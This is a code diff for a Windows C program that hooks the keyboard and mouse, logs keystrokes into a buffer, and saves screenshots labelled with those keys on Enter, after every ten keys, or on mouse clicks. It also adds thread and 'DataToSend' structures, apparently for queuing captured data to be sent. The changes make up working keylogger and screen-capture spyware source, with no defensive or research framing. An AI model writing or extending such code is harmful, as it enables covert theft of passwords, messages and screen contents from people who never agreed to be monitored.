@@ -7,6 +7,8 @@ int counter = 0;
 char logger[100];
 
 
+
+
 // set up keyboard hook
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -14,43 +16,58 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     if(nCode == HC_ACTION)
     {
         KBDLLHOOKSTRUCT *keyInfo = (KBDLLHOOKSTRUCT *)lParam;
-        if (wParam == WM_KEYDOWN) {
-            int keyCode = (int)keyInfo->vkCode;
-            if(counter < 10)
+        if (keyInfo->vkCode == VK_RETURN)
+        {
+            logger[counter] = '\0';
+            const char* fileName = nameFile();
+            if(fileName != NULL)
             {
-                logger[counter] = (char)keyCode;
-                logger[counter + 1] = '\0';
-                counter ++;
-            }
-            else{
-                logger[counter] = (char)keyCode;
-                logger[counter + 1] = '\0';
-                char* fileName = nameFile();
                 CaptureScreen(fileName, 20, logger);
                 counter = 0;
+            }
+        }
+        else{
+            if (wParam == WM_KEYUP) {
+            //if (wParam == WM_KEYDOWN) {
+                int keyCode = (int)keyInfo->vkCode;
+                if(counter < 10)
+                {
+                    logger[counter] = (char)keyCode;
+                    logger[counter + 1] = '\0';
+                    counter ++;
+                }
+                else{
+                    logger[counter] = (char)keyCode;
+                    logger[counter + 1] = '\0';
+                    const char* fileName = nameFile();
+                    if(fileName != NULL)
+                    {
+                        CaptureScreen(fileName, 20, logger);
+                        counter = 0;
+                    }
 
-            };
+                };
+            // if(keyCode >= 65 && keyCode <=90){
+                //   if(counter < 5){
+                //     logger[counter] = (char)keyCode;
+                    //   logger[counter + 1] = '\0';
+                    // counter++;
+                    //}
+                    //else{
+                    //  logger[counter] = (char)keyCode;
+                        //logger[counter + 1] = '\0';
+                        //char* fileName = nameFile();
+                        //CaptureScreen(fileName, 20, logger);
+                        //counter = 0;
+                    //}
 
-           // if(keyCode >= 65 && keyCode <=90){
-             //   if(counter < 5){
-               //     logger[counter] = (char)keyCode;
-                 //   logger[counter + 1] = '\0';
-                   // counter++;
                 //}
                 //else{
-                  //  logger[counter] = (char)keyCode;
-                    //logger[counter + 1] = '\0';
-                    //char* fileName = nameFile();
+                //  char* fileName = nameFile();
                     //CaptureScreen(fileName, 20, logger);
                     //counter = 0;
                 //}
-
-            //}
-            //else{
-              //  char* fileName = nameFile();
-                //CaptureScreen(fileName, 20, logger);
-                //counter = 0;
-            //}
+            }
         }
     }
     printf("Keyboard Hook set.\n");
@@ -63,20 +80,39 @@ LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
     printf("Setting up mouse gook.\n");
     if(nCode == HC_ACTION)
     {
-        if(wParam == WM_LBUTTONUP || wParam == WM_RBUTTONUP)
+        if(wParam == WM_LBUTTONUP || wParam == WM_RBUTTONUP || wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN )
         {
-            char* fileName = nameFile();
-            CaptureScreen(fileName, 20, logger);
-            counter = 0;
+            const char* fileName = nameFile();
+            if(fileName != NULL)
+            {
+                logger[counter + 1] = '\0';
+                CaptureScreen(fileName, 20, logger);
+                counter = 0;
+            }
         }
     }
     printf("Mouse hook set.\n");
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+    // initialize data to zero
+    
+    
+    DataToSend listOfPending[MAX_THREADS] = {0};    // Initialize all data to NULL for pointers and empty strings for arrays
+    HANDLE threadHandles[MAX_THREADS];
+    
+
 
 // main entry
 int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE prevhInstance, LPSTR cmdlarg, int nCmdShow) {
+   
+
+    printf("Cleaning Slate");
+    for (int i = 0; i < MAX_THREADS; i++)
+    {
+        threadHandles[i] = NULL;
+    }   // initialize all handles to null
+    printf("SlATE Clean.\n");
 
     printf("Program entereed\n");
 
@@ -90,6 +126,8 @@ int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE prevhInstance, LPSTR cmdlar
         printf("Error setting mouse hook.\n");
         return 1;
     }
+    
+///
     // Capture the screen and save it as a JPEG file with high compression (quality 30)
     // Message loop to keep the hook active
     MSG msg;
